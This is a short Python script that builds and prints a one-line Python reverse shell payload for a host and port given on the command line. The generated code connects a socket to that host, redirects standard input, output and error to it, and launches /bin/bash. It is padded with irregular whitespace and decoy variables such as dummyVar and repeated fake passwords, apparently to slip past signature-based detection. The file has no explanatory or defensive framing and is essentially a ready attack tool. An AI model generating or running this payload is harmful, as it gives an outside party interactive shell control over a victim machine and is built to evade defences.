import sys
host = str(sys.argv[1])
port = sys.argv[2]

payload = "import base64 , socket    ,  subprocess    ,  os        ;dummyVar = \"This is a file\";password = \"Th!$isThePa55W0rD\" ;password2 = \"Th!$isThePa55W0rD\" ;password3 = \"Th!$isThePa55W0rD\" ;WhatPort=" + port + "      ;connectTo=\"" + host + "\"      ;s=socket.socket(socket.AF_INET    ,  socket.SOCK_STREAM)        ;s.connect((connectTo    ,  WhatPort))        ;os.dup2(s.fileno()    ,  0)        ;os.dup2(s.fileno()    ,  1)        ;os.dup2(s.fileno()    ,  2)        ;p=subprocess.call(\"/bin/bash\")"

print(payload)
